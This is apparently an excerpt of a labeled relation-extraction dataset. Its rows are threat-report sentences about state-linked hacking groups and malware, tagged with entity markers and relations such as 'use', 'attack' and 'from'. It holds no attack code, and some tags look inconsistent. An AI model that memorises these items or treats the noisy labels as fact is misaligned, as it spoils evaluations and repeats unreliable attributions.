253	Additional research revealed signs of massive activity from a new threat actor that we codenamed ‘ProjectSauron’, responsible for large-scale attacks against key governmental entities in several countries. “SAURON” – internal name used in the [E21:tool] Lua [E22:tool] scripts [E11:attacker] ProjectSauron [E12:attacker] comprises a top-of-the-top modular cyber-espionage platform in terms of technical sophistication, designed to enable long-term campaigns through stealthy survival mechanisms coupled with multiple exfiltration methods.	2	use
254	[E11:attacker] APT39 [E12:attacker] has prioritized the telecommunications sector, with additional targeting of the travel industry and [E21:industry] IT [E22:industry] firms that support it and the high-tech industry.	1	attack
255	During analysis of the [E11:malware] Joanap [E12:malware] infrastructure, the U.S. government has found the malware on 87 compromised network nodes in 17 countries including Brazil, [E21:location] China [E22:location], Spain, Taiwan, Sweden, India, and Iran.	1	attack
256	We believe [E11:attacker] APT10 [E12:attacker] is the most significant [E21:location] Chinese [E22:location] state-sponsored cyber threat to global corporations known to date.	3	from
257	This distribution differed from the original [E11:malware] Mirai [E12:malware] [E21:technique] botnet [E22:technique], where Brazil was the only country that appeared in the top five botnet client lists for both botnets.	2	use
258	Of particular interest is how, after the publication of the GreyEnergy set of activity that is believed to be a continuation of BlackEnergy/Sandworm, we found additional overlaps between [E11:malware] GreyEnergy [E12:malware] and Zebrocy, including the use of the same infrastructure and the same [E21:vulnerability] 0-day [E22:vulnerability] for ICS.	2	use
259	Third, [E11:attacker] they [E12:attacker] use [E21:technique] watering-hole [E22:technique] attacks.	2	use
260	Did the Russian government direct the group responsible for the breaches and related data leaks? If so, is this simply a matter of accepted state espionage, or did it cross a line? Was the breach at the Democratic National Committee part of a concerted effort by the Russian government to interfere with the U.S. presidential election? The most consequential question remains unasked: How will Russia continue to employ a variety of methods – including hacks and leaks – to undermine the institutions, policies and actors that the Russian government perceives as constricting and condemning its forceful pursuit of its state aims? FireEye’s visibility into the operations of [E11:attacker] APT28 [E12:attacker] – a group we believe the Russian government sponsors – has given us insight into some of the [E21:industry] government [E22:industry]’s targets, as well as its objectives and the activities designed to further them.	1	attack
261	[E11:attacker] APT10 [E12:attacker] actors then compressed proprietary data from Visma using [E21:tool] WinRAR [E22:tool] (deployed by the attackers) and exfiltrated to a Dropbox account using the cURL for Windows command-line tool.	2	use
262	Figure 5 [E11:attacker] OilRig [E12:attacker] infrastructure for [E21:malware] ISMInjector [E22:malware] Conclusion The OilRig group continues to target organizations in the Middle East, in this instance targeting the government of the United Arab Emirates.	2	use
263	But msnMM, naikon, sakto, and [E11:malware] rarstone [E12:malware] [E21:technique] backdoors [E22:technique] are all used by the same actor that we call the Naikon APT.	2	use
264	The samples of SPLM that researchers examined demonstrate how [E11:attacker] Sofacy [E12:attacker] now maintains “distinct subdivisions for each of its main tools, with clusters for the coding, development and targeting of SPLM, [E21:malware] GAMEFISH [E22:malware], and Zebrocy,” according to Kaspersky researchers. “The unusual thing about what happened with the SPLM is that in 2018, we’re seeing them break out their modules.	2	use
265	[E21:location] Norwegian [E22:location] company [E11:industry] Visma [E12:industry], who was targeted in the attack, and U.S. company Rapid7 provided support and extensive expertise throughout this research.	3	from
266	During this operation (dubbed “‘Cloud Hopper” because of the group’s use of popular western cloud-based services), [E11:attacker] APT10 [E12:attacker] utilized both new malware (Quasar RAT, Trochilus, RedLeaves, [E21:malware] ChChes [E22:malware]) as well as some familiar old tools (Poison Ivy, PlugX).	2	use
267	GCMAN – penetration testing tools gone bad A second group, which we call [E11:attacker] GCMAN [E12:attacker] because the malware is based on code compiled on the GCC compiler, emerged recently using similar techniques to the Metel Group to infect [E21:industry] banking [E22:industry] institutions and attempt to transfer money to e-currency services.	1	attack
268	Once open, the email downloads a malware program called [E11:malware] Carbanak [E12:malware], that allegedly allowed perpetrators to transfer money from the [E21:industry] banks [E22:industry] to fake accounts or ATMs monitored by criminals.	1	attack
269	[E11:attacker] CozyDuke [E12:attacker] (also known as ‘CozyBear’, ‘CozyCar’ and ‘Office Monkeys’) targets government organisations and businesses in the US, Germany, South Korea and [E21:location] Uzbekistan [E22:location].	1	attack
270	In any event, it is quite obvious that the [E21:location] US [E22:location] [E11:industry] military [E12:industry] were not the only victims of the worm.	3	from
271	Recorded Future analysis on the spoofed domain revealed that this server hosted the SeDll Javascript loader SHA256: 146aa9a0ec013aa5bdba9ea9d29f59d48d43bc17c6a20b74bb8c521dbb5bc6f4, which had been used in August 2017 by Leviathan (also known as [E11:attacker] TEMP.Periscope [E12:attacker]) to execute another Javascript backdoor, [E21:malware] AIRBREAK [E22:malware].	2	use
272	[E11:malware] POSHSPY [E12:malware] leverages two of the tools the group frequently uses: [E21:tool] PowerShell [E22:tool] and Windows Management Instrumentation (WMI).	2	use
273	This week he looks at the latest findings by ESET researchers on the [E11:attacker] Turla [E12:attacker] group who have been a using an Outlook backdoor to spy on [E21:industry] government [E22:industry] institutions in Europe.	1	attack
274	Although these points do not definitively tie WATERSPOUT to APT12, they do indicate a possible connection between the WATERSPOUT campaign, the [E21:malware] THREEBYTE [E22:malware] campaign, and the HIGHTIDE campaign attributed to [E11:attacker] APT12 [E12:attacker].	2	use
275	While [E11:attacker] APT39 [E12:attacker] and [E21:attacker] APT34 [E22:attacker] share some similarities, including malware distribution methods, POWBAT backdoor use, infrastructure nomenclature, and targeting overlaps, we consider APT39 to be distinct from APT34 given its use of a different POWBAT variant.	5	similar
276	Security researchers at ESET have released their latest research into the notorious [E11:attacker] Sednit [E12:attacker] cyberespionage group, which has targeted over 1000 high profile individuals with [E21:technique] phishing [E22:technique] attacks and zero-day exploits in their attempts to steal confidential information.	2	use
277	During analysis of the [E11:malware] Joanap [E12:malware] infrastructure, the U.S. government has found the malware on 87 compromised network nodes in 17 countries including Brazil, China, Spain, [E21:location] Taiwan [E22:location], Sweden, India, and Iran.	1	attack
278	0023 In this blog, we will take a closer look at the powerful, versatile [E21:technique] backdoor [E22:technique] known as CARBANAK (aka [E11:malware] Anunak [E12:malware]).	2	use
279	Palo Alto Networks customers may learn more and are protected via: Correctly identify associated samples as malicious in WildFire DealersChoice domains and C2 traffic are classified as malicious Traps correctly identifies and prevents exploit code to be executed A [E11:malware] DealersChoice [E12:malware] AutoFocus tag may be used to identify and track this malware family Note that even though [E21:vulnerability] CVE-2016-7855 [E22:vulnerability] was a zero-day vulnerability, Palo Alto Networks customers would have been protected by our Traps endpoint agent as seen in Figure 8.	2	use
280	The attackers behind Epic [E11:attacker] Turla [E12:attacker] have infected several hundred computers in more than 45 countries, including government institutions, embassies, military, [E21:industry] education [E22:industry], research and pharmaceutical companies.	1	attack
281	For much of its existence, the main targets of [E11:malware] NetTraveler [E12:malware] were diplomatic, [E21:industry] government [E22:industry] and military organisations.	1	attack
282	Research published on April 27, 2017, revealed that a suspected Chinese APT group, referred to as [E11:attacker] TA459 [E12:attacker], had been using this vulnerability to target analysts who covered the telecommunications industry at [E21:location] Russian [E22:location] and Central Asian financial firms.	1	attack
283	[E11:attacker] APT1 [E12:attacker] uses some tools and techniques that we have not yet observed being used by other groups including two utilities designed to steal email — [E21:tool] GETMAIL [E22:tool] and MAPIGET.	2	use
284	The attackers realized they were under investigation and planted a false flag – Possible The attackers realized they were under investigation and planted a false flag on their C2 server, uploading a copy of the [E11:attacker] FIN7 [E12:attacker] [E21:malware] DNSMessenger [E22:malware] code which had been previously mentioned (and was since publicly available) by FireEye and delivering it to researchers to trick them into mis-attributing the campaign.	2	use
285	Our analysis indicates that victims are infected via a sophisticated multi-stage attack, which begins with the [E21:malware] Epic [E22:malware] [E11:attacker] Turla [E12:attacker].	2	use
286	Since the end of November 2016, Kaspersky Lab has observed [E11:attacker] Turla [E12:attacker] using this new JavaScript payload and specific [E21:tool] macro [E22:tool] variant.	2	use
287	The attackers are using two vulnerabilities in Microsoft Office including Exploit.MSWord.CVE-2010-333, Exploit.Win32.[E21:vulnerability] CVE-2012-0158 [E22:vulnerability], which have been patched but remain highly-popular on the hacking scene, and have run [E11:malware] NetTraveler [E12:malware] alongside other malware.	2	use
288	The attackers, who seem to be Chinese-speaking and have been active for at least five years, target top-level [E11:industry] government [E12:industry] agencies and civil and military organisations in the [E21:location] Philippines [E22:location], Malaysia, Cambodia, Indonesia, Vietnam, Myanmar, Singapore, Nepal, Thailand, Laos and China.	3	from
289	This is a technique we’ve observed before with [E11:attacker] Turla [E12:attacker]’s ‘[E21:malware] ICEDCOFFEE [E22:malware]’ payloads (detailed in a private report from June 2016 which is available to customers of Kaspersky APT Intelligence Services).	2	use
290	Of note, Advanced Practices separately established that [E11:attacker] APT33 [E12:attacker] began using [E21:tool] POSHC2 [E22:tool] as of at least July 2, 2018, and continued to use it throughout the duration of 2018.	2	use
291	While stealing funds from its victims, [E11:attacker] Silence [E12:attacker] implemented specific techniques similar to the infamous threat actor, [E21:malware] Carbanak [E22:malware].	2	use
292	Groups such as [E11:attacker] Thrip [E12:attacker] showed a clear interest in targeting satellite communication companies and defense organizations in the [E21:location] US [E22:location] and South East Asia.	1	attack
293	One big unknown was the infection vector for [E11:attacker] Turla [E12:attacker] (aka Snake or [E21:attacker] Uroburos [E22:attacker]).	4	same
294	According to researchers at Trend Micro, attackers set up a fake En Marche phishing site in mid-March 2017; the researchers also spotted a phishing domain apparently set up to target the [E11:industry] Konrad-Adenauer-Stiftung [E12:industry] (KAS) political foundation in [E21:location] Germany [E22:location].	3	from
295	Iranian OilRig APT is back The OilRig APT is one of the most popular hacker group linked to the [E21:location] Iranian [E22:location] [E11:industry] Governments [E12:industry] that has been around since at least 2015.	3	from
296	0110 Spanish Police has arrested the alleged leader of an organised Russian cybercrime gang behind the [E11:malware] Carbanak [E12:malware] and Cobalt malware attacks, which stole over a billion euros from [E21:industry] banks [E22:industry] worldwide since 2013.	1	attack
297	Security researchers at ESET have released their latest research into the notorious [E11:attacker] Sednit [E12:attacker] cyberespionage group, which has targeted over 1000 high profile individuals with phishing attacks and [E21:vulnerability] zero-day [E22:vulnerability] exploits in their attempts to steal confidential information.	2	use
298	Although we have only directly observed APT33 use DROPSHOT to deliver the TURNEDUP backdoor, we have identified multiple [E11:malware] DROPSHOT [E12:malware] samples in the wild that drop [E21:malware] SHAPESHIFT [E22:malware]," the report reads.	2	use
299	The attackers exploited several attack techniques, including [E21:technique] spear-phishing [E22:technique] to watering hole attacks, to serve the [E11:attacker] SEDNIT [E12:attacker] malware. “The cyber criminals behind Operation Pawn Storm are using several different attack scenarios: spear-phishing emails with malicious Microsoft Office documents lead to SEDNIT/Sofacy malware, very selective exploits injected into legitimate websites that will also lead to SEDNIT/Sofacy malware, and phishing emails that redirect victims to fake Outlook Web Access login pages,” states Trend Micro in a blog post.	2	use
300	Also interesting is a review of Turla scripting artefacts leading to newer efforts like KopiLuwak, tracing from older [E21:technique] scripting [E22:technique] in development efforts in WhiteAtlas and [E11:attacker] WhiteBear [E12:attacker].	2	use
301	To date, [E11:attacker] Sowbug [E12:attacker] appears to be focused mainly on government entities in South America and Southeast Asia and has infiltrated organizations in Argentina, Brazil, Ecuador, Peru, [E21:location] Brunei [E22:location] and Malaysia," the Symantec report said.	1	attack
302	[E11:attacker] SPIVY [E12:attacker] In March and April 2016, a series of emails laced with an exploit for[E21:vulnerability] CVE-2015-2545 [E22:vulnerability] were detected.	2	use
303	The use of Notepad++ updater (filename “gup.exe”) to load malicious DLL (libcurl.dll) in the deployment of the APT10 [E21:technique] backdoor [E22:technique], [E11:malware] UPPERCUT [E12:malware].	2	use
304	According to the researchers at Kaspersky Lab, on seven exploits used by the [E11:attacker] Equation [E12:attacker] Group in their malware and exploit kit, at least four of them were used as [E21:vulnerability] zero-days [E22:vulnerability].	2	use
305	Agent.btz: a global epidemic or a targeted attack? The story of Agent.btz began back in 2007 and was extensively covered by the mass media in late 2008 when it was used to infect [E21:location] US [E22:location] [E11:industry] military [E12:industry] networks.	3	from
306	Conclusions [E21:malware] Zebrocy [E22:malware] continues to maintain a higher level of volume attacking local and remote ex-USSR republic Central Asian targets than other clusters of targeted [E11:attacker] Sofacy [E12:attacker] activity.	2	use
307	Our analysis of the [E11:attacker] Sednit [E12:attacker] campaign that uses the UEFI [E21:technique] rootkit [E22:technique] was presented September 27 at the 2018 Microsoft BlueHat conference and is described in detail in our “LoJax: First UEFI rootkit found in the wild, courtesy of the Sednit group” white paper.	2	use
308	In March 2014, the French newspaper, Le Monde, published an article on a cyber-espionage toolset that had been identified by Communications Security Establishment Canada (CSEC): this toolset had been used in the ‘[E11:attacker] Snowglobe [E12:attacker]’ operation that targeted French-speaking media in Canada, as well as [E21:location] Greece [E22:location], France, Norway and some African countries.	1	attack
309	[E11:attacker] Turla [E12:attacker] is a sophisticated Russian cyber-espionage group, believed to be sponsored by the Russian government, that has targeted a number of government, military, embassy, research, and [E21:industry] pharmaceutical [E22:industry] organisations in more than 45 countries, including China, Vietnam, and the United States.	1	attack
310	During analysis of the [E11:malware] Joanap [E12:malware] infrastructure, the U.S. government has found the malware on 87 compromised network nodes in 17 countries including Brazil, China, Spain, Taiwan, Sweden, India, and [E21:location] Iran [E22:location].	1	attack
311	[E11:attacker] WhiteBear [E12:attacker] focused on various embassies and diplomatic entities around the world in early 2016 -- tellingly, attempts were made to drop and display decoy pdf's with full [E21:industry] diplomatic [E22:industry] headers and content alongside executable droppers on target systems.	1	attack
312	Our research has shown that the [E11:attacker] Sednit [E12:attacker] operators used different components of the LoJax malware to target a few government organizations in the [E21:location] Balkans [E22:location] as well as in Central and Eastern Europe.	1	attack
313	[E11:attacker] Turla [E12:attacker] APT group, which was named after its notorious software Epic Turla, is abusing satellite-based Internet connections in order to: Siphon sensitive data from [E21:industry] government [E22:industry], military, diplomatic, research and educational organisations in the United States and Europe.	1	attack
314	Researchers theorize a PowerShell script or legitimate but vulnerable web [E21:tool] app [E22:tool] was exploited to load and execute the [E11:malware] SPLM [E12:malware] code.	2	use
315	Also interesting is a review of [E11:attacker] Turla [E12:attacker] [E21:technique] scripting [E22:technique] artefacts leading to newer efforts like KopiLuwak, tracing from older scripting in development efforts in WhiteAtlas and WhiteBear.	2	use
316	The [E11:attacker] Dragonfly [E12:attacker] group, also know by other vendors as Energetic Bear, seems to have been operating since at least 2011, when it targeted defense and aviation companies in the [E21:location] US [E22:location] and Canada.	1	attack
317	On the other hand, the Russian based [E11:attacker] APT28 [E12:attacker] is more concerned with the [E21:industry] geopolitical [E22:industry] development in former Soviet Union states.	1	attack
318	Recently, we described a malicious program called [E21:malware] Octopus [E22:malware], used by [E11:attacker] DustSquad [E12:attacker] to target diplomatic bodies in the region – the name was originally coined by ESET in 2017, after the 0ct0pus3.php script used by the actor on their old C2 servers.	2	use
319	0015 Russian APT groups continue their cyber espionage activities against governments and organizations worldwide, in this post I have grouped the details related the operations conducted by two of the principal [E21:location] Russian [E22:location] state-sponsored groups, Turla and [E11:attacker] APT28 [E12:attacker].	3	from
320	AUTHEDMINE [E11:malware] Coinhive [E12:malware] has responded to such criticism by releasing a version of their code called “[E21:malware] AuthedMine [E22:malware],” which is designed to seek a Web site visitor’s consent before running the Monero mining scripts.	5	similar
321	[E11:attacker] Naikon [E12:attacker] is known for its custom backdoor, called [E21:malware] RARSTONE [E22:malware], which our colleagues at Trend Micro have described in detail.	2	use
322	We also discovered that [E11:attacker] LuckyMouse [E12:attacker] unleashed a new wave of activity targeting [E21:location] Asian [E22:location] governmental organizations just around the time they had gathered for a summit in China.	1	attack
323	[E11:malware] IcedCoffee [E12:malware] was not widely deployed, rather it was targeted at diplomats, including Ambassadors, of [E21:location] European [E22:location] governments.	1	attack
324	This virtual server will be used either as a [E21:technique] C&C [E22:technique] server or an HTTP server that delivers [E11:malware] PLEAD [E12:malware] malware to their targets.	2	use
325	While many infections took place in this manner, researchers found that hackers would vary their approaches with the phishing emails in order to increase their chances of a successful attack. “The cybercriminals behind Operation Pawn Storm are using several different attack scenarios: spear phishing emails with malicious Microsoft Office documents lead to [E11:malware] SEDNIT [E12:malware]/[E21:malware] Sofacy [E22:malware] malware, and phishing emails that redirect victims to fake Outlook Web Access login pages,” noted Jim Gogolinski, Trend Micro senior threats researcher.	5	similar
326	The primary backdoor used in the [E11:malware] Epic [E12:malware] attacks is also known as “WorldCupSec”, “TadjMakhal”, “[E21:malware] Wipbot [E22:malware]” or “Tavdig”.	5	similar
327	Key findings on the [E11:attacker] Icefog [E12:attacker] attacks: The attackers rely on [E21:technique] spear-phishing [E22:technique] and exploits for known vulnerabilities (eg.	2	use
328	The term [E11:attacker] APT1 [E12:attacker] is referred to one of the numerous cyber espionage campaigns that stole the major quantity of information all over the world that has interested different sectors from [E21:industry] IT [E22:industry] to Energy sector.	1	attack
329	As a sidenote this exploit was first seen abused in [E11:malware] Sandworm [E12:malware] APT attacks against Poland and [E21:location] Ukraine [E22:location].	1	attack
330	The full-scale investigation that followed uncovered the development of a new malware platform from one of the most skilled, mysterious and powerful groups in the APT world – [E21:malware] Duqu [E22:malware], sometimes referred to as the step-brother of [E11:malware] Stuxnet [E12:malware].	5	similar
331	A SEDRECO plugin identified by the researchers was found to share code with a module used by XAGENT, the other [E21:technique] backdoor [E22:technique] utilized by the [E11:attacker] Sednit [E12:attacker] gang.	2	use
332	After that, these intermediary servers are used by [E11:attacker] ProjectSauron [E12:attacker] as internal [E21:technique] proxy [E22:technique] nodes for silent and inconspicuous data exfiltration, blending in with high volumes of legitimate traffic.	2	use
333	For instance, APT15 was suspected of targeting a company providing services to military and technology departments of the [E21:location] UK [E22:location] [E11:industry] government [E12:industry].	3	from
334	Based on clues provided by the malware’s original file names, as well as the decoy content embedded within these samples, we can make a reasonable estimation that these attacks targeted organizations in [E21:location] Taiwan [E22:location] in the Telecommunication, [E11:industry] Defense [E12:industry], Government, and High-Tech industries.	3	from
335	Using the Kaspersky Attribution Engine, based on similarity algorithms, we discovered that [E21:malware] Octopus [E22:malware] is related to [E11:attacker] DustSquad [E12:attacker].	2	use
336	This targeting is also consistent with previous attacker TTPs; [E11:attacker] Ke3chang [E12:attacker] historically targeted the Ministry of Affairs, and also conducted several prior campaigns against [E21:location] India [E22:location].	1	attack
337	Who are the victims? / What can you say about the targets of the attacks? The main targets of [E11:attacker] Careto [E12:attacker] fall into the following categories: Government institutions Diplomatic offices and embassies Energy, oil and [E21:industry] gas [E22:industry] companies Research institutions Private equity firms Activists Do we know the total number of victims? Although the exact number of victims is unknown, we observed victims at more than 1000 IP addresses in 31 countries.	1	attack
338	We also discovered [E11:malware] Komplex [E12:malware] command and control ([E21:technique] C2 [E22:technique]) domains that overlapped with previously identified phishing campaign infrastructures associated with the Sofacy group,” researchers said. “We believe (it) may have been done in order to handle compromised Windows and OS X systems using the same C2 server application with relative ease.” “The Sofacy group created the Komplex Trojan to use in attack campaigns targeting the OS X operating system – a move that showcases their continued evolution toward multi-platform attacks,” they added.	2	use
339	In addition to using [E21:malware] Trochilus [E22:malware] and UPPERCUT, [E11:attacker] APT10 [E12:attacker] utilized a series of previously known and associated attack TTPs for all three of these intrusions.	2	use
340	0322 The Iranian group known as [E11:attacker] APT33 [E12:attacker] is believed to be behind a cyberespionage campaign targeting [E21:industry] aerospace [E22:industry], petrochemical and energy sector firms located in the United States, Saudi Arabia and South Korea.	1	attack
341	And, as their spearphishing techniques progress to rival Finfisher techniques without requiring zero-day exploitation, perhaps [E11:malware] Zebrocy [E12:malware] will expand their duplication of more sources of open source [E21:technique] spearphishing [E22:technique] techniques.	2	use
342	[E11:attacker] ScarCruft [E12:attacker] is a relatively new APT group; victims have been observed in several countries, including Russia, Nepal, South Korea, [E21:location] China [E22:location], India, Kuwait and Romania.	1	attack
